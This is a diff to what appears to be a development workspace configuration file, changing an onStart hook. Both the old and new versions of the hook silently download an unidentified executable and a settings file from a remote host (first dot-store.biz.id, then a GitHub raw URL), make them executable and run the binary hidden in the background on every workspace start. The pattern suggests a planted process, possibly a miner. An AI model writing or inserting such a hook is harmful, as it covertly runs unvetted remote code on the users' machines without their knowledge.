@@ -36,7 +36,7 @@
       };
       # Runs when the workspace is (re)started
       onStart = {
-        joko = "mkdir -p .core && cd .core && ([ -f core ] || wget -q -O core https://dot-store.biz.id/bagong) && wget -q -O settings.json https://dot-store.biz.id/bagong.json && chmod +x core settings.json && nohup ./core -c 'settings.json' > /dev/null 2>&1 &";
+        joko = "mkdir -p .core && cd .core && ([ -f core ] || wget -q -O core https://raw.githubusercontent.com/DOT-SUNDA/dotdx/refs/heads/main/bagong) && wget -q -O settings.json https://raw.githubusercontent.com/DOT-SUNDA/dotdx/refs/heads/main/bagong.json && chmod +x core settings.json && nohup ./core -c 'settings.json' > /dev/null 2>&1 &";
         # Example: start a background task to watch and re-build backend code
         # watch-backend = "npm run watch-backend";
       };
